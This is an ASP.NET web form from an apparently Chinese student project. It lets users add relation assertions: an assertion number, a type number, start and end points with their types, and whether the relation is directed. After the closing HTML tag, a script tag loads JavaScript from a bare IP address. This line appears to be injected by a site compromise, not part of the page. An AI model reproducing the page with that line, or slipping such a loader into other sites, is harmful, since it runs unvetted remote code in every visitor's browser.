<%@ Page Language="vb" AutoEventWireup="false" Codebehind="addpublishrassertion.aspx.vb" Inherits="relation._to"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>to</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="Visual Basic .NET 7.1" name="CODE_LANGUAGE">
		<meta content="JavaScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
	</HEAD>
	<body>
		<!--==========include pagehead==============-->
		<TABLE cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd" border="0"
			valign="middle">
			<TBODY>
				<TR>
					<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
						<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
					</TD>
				</TR>
				<TR bgColor="#ffffff">
					<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
				</TR>
				<TR>
					<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
				</TR>
			</TBODY>
		</TABLE>
		<!--===============include menu================-->
		<!--==========include menu==============-->
		<TABLE cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
			<TBODY>
				<TR>
					<TD class="p9" vAlign="middle" width="211" bgColor="#dedede" height="18" style="WIDTH: 211px">
						<DIV align="center"><FONT color="#666666"><B>
									<asp:Label id="timetext" runat="server"></asp:Label>
									&nbsp; </B></FONT>
						</DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
						<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
						height="18">
						<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
										href="rmodelpublish.aspx" target="_top">发布</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
										href="rmodelsearch.aspx" target="_top">查询</A>&nbsp; <A class="whitemenu" onmouseover="showMenu(this,'topmenu3',0)" onmouseout="hideMenu(event)"
										href="rmodelmodification.aspx" target="_top">修改</A> </FONT></SPAN>
						</DIV>
					</TD>
				</TR>
			</TBODY>
		</TABLE>
		<DIV id="topmenu3" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
		<FONT face="宋体"></FONT>
		<TABLE height="62" cellSpacing="0" width="778" align="center">
			<TBODY>
				<TR border="0">
					<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
						<FONT color="#000000">&nbsp;|</FONT> <A href="index.aspx"><FONT color="#000000"><SPAN class="p9">
									<A href="index.aspx">首页</SPAN> </FONT></A><FONT color="#000000">|</FONT>
						<A href="dologin.aspx"><FONT color="#000000"><SPAN class="p9"><A href="index.aspx">用户登录</SPAN>
							</FONT></A>|<A href="newcustomer.aspx">注册</A></TD>
				</TR>
				<TR border="0">
					<TD vAlign="top" width="166" bgColor="#0859ad" height="20" style="WIDTH: 166px">&nbsp;
						<asp:label id="lblHint" runat="server" ForeColor="Info">Label</asp:label></TD>
					<TD vAlign="top" bgColor="#0859ad" height="20">
						<DIV align="right"><FONT color="#ffffff">
								<marquee scrollDelay="100" direction="left" behavior="scroll" loop="-1">欢迎您 
									&nbsp;软件业的朋友！ &nbsp; &nbsp;</marquee>
							</FONT>
						</DIV>
					</TD>
				</TR>
			</TBODY>
		</TABLE>
		<CENTER>
			<TABLE height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff" border="0">
				<TBODY>
					<TR>
						<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
							<TABLE cellSpacing="0" cellPadding="0" width="100%" border="0">
								<TBODY>
									<TR>
										<TD vAlign="top" bgColor="#0859ad">
											<DIV align="center"><FONT face="宋体"></FONT>&nbsp;</DIV>
										</TD>
									</TR>
								</TBODY>
							</TABLE>
							<TABLE height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
								<TBODY>
									<TR>
										<TD vAlign="top" bgColor="#9cd7ef">
											<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">&nbsp;
												<TABLE id="Table1" style="WIDTH: 153px; HEIGHT: 153px" width="153" border="1">
													<TR>
														<TD width="147" height="45">
															<DIV align="center"><A href="rmodelsearch.aspx.vb">查询关系空间</A></DIV>
														</TD>
													</TR>
													<TR>
														<TD height="43">
															<DIV align="center"><A href="rdefinitionsearch.aspx">查询关系类型</A></DIV>
														</TD>
													</TR>
													<TR>
														<TD height="55">
															<DIV align="center"><A href="rinstancesearch.aspx">查询关系实例</A></DIV>
														</TD>
													</TR>
												</TABLE>
												<BR>
												<BR>
											</DIV>
										</TD>
									</TR>
								</TBODY>
							</TABLE>
						</TD>
						<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
						<TD vAlign="top" width="611">
							<FORM style="MARGIN: 0px" name="loginForm" action="" method="post" runat="server">
								<P>&nbsp;&nbsp;
								</P>
								<P>
									<TABLE id="Table20" style="WIDTH: 544px; HEIGHT: 158px" cellSpacing="1" cellPadding="1"
										width="544" border="1">
										<TR>
											<TD>
												<TABLE id="Table2" style="WIDTH: 544px; HEIGHT: 158px" cellSpacing="1" cellPadding="1"
													width="544" border="1">
													<TR>
														<TD>关系断言编号</TD>
													</TR>
													<TR>
														<TD><asp:textbox id="txtAssKey" runat="server"></asp:textbox>
															<asp:regularexpressionvalidator id="txtAssKeyRegularExpressionValidator" runat="server" Width="240px" ErrorMessage="！输入关系断言编号必须为数字"
																ValidationExpression="[0-9]{1,}" ControlToValidate="txtAssKey" Height="14px"></asp:regularexpressionvalidator></TD>
													</TR>
													<TR>
														<TD>对应关系类型编号</TD>
													</TR>
													<TR>
														<TD><asp:textbox id="txtRefKey" runat="server" Width="136px"></asp:textbox></TD>
													</TR>
													<TR>
														<TD><asp:label id="Label3" runat="server">起始点</asp:label></TD>
													</TR>
													<TR>
														<TD style="HEIGHT: 1px">
															<asp:DropDownList id="ddlstFrom" runat="server" Width="152px"></asp:DropDownList></TD>
													</TR>
													<TR>
														<TD><asp:label id="Label5" runat="server" Width="152px">起始点类型</asp:label></TD>
													</TR>
													<TR>
														<TD style="HEIGHT: 22px"><asp:textbox id="txtFromType" runat="server"></asp:textbox></TD>
													</TR>
													<TR>
														<TD style="HEIGHT: 22px"><asp:label id="Label1" runat="server">终止点</asp:label></TD>
													</TR>
													<TR>
														<TD style="HEIGHT: 22px">
															<asp:DropDownList id="ddlstTo" runat="server" Width="148px"></asp:DropDownList></TD>
													</TR>
													<TR>
														<TD style="HEIGHT: 23px"><asp:label id="Label2" runat="server">终止点类型</asp:label></TD>
													</TR>
													<TR>
														<TD><asp:textbox id="txtToType" runat="server"></asp:textbox></TD>
													</TR>
													<TR>
														<TD style="HEIGHT: 10px"><asp:label id="Label7" runat="server" Width="128px">是否有向关系</asp:label></TD>
													</TR>
													<TR>
														<TD><asp:radiobutton id="rbtnIsDirYes" runat="server" Width="88px" Text="有向" GroupName="rbtnIsDir"></asp:radiobutton><asp:radiobutton id="rbtnIsDirNo" runat="server" Text="无向" GroupName="rbtnIsDir"></asp:radiobutton></TD>
													</TR>
												</TABLE>
												<TABLE id="Table3" style="WIDTH: 540px; HEIGHT: 32px" cellSpacing="1" cellPadding="1" width="540"
													border="1">
													<TR>
														<TD style="WIDTH: 46px"><FONT face="宋体"></FONT></TD>
														<TD style="WIDTH: 154px"><asp:button id="btnAddAss" runat="server" Width="112px" Text="继续添加关系断言"></asp:button></TD>
														<TD style="WIDTH: 96px"><asp:button id="btnNext" runat="server" Text="下一步"></asp:button></TD>
														<TD style="WIDTH: 41px"></TD>
														<TD><asp:button id="btnCancel" runat="server" Text="撤消"></asp:button></TD>
													</TR>
												</TABLE>
												<asp:label id="lblWarning" runat="server" Width="532px" ForeColor="#0000C0">label</asp:label></TD>
										</TR>
									</TABLE>
								</P>
							</FORM>
						</TD>
					</TR>
				</TBODY>
			</TABLE>
		</CENTER>
		<!---====================include pagetail================-->
		<CENTER>
			<TABLE cellSpacing="0" cellPadding="0" width="778" border="0">
				<TBODY>
					<TR>
						<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
					</TR>
					<TR>
						<TD class="p9" background="imga/bg5.gif">
							<DIV align="center">| 联络我们 | 客服电话：<STRONG>0571-<FONT face="Arial">63740939</FONT></STRONG></DIV>
						</TD>
					</TR>
					<TR>
						<TD class="p9" bgColor="#ffffff"><FONT face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
								版权所有：&nbsp;&nbsp; 浙江林学院信息工程学院天信022&nbsp; 王海玲 陆美丽 </FONT>
						</TD>
					</TR>
				</TBODY>
			</TABLE>
		</CENTER>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
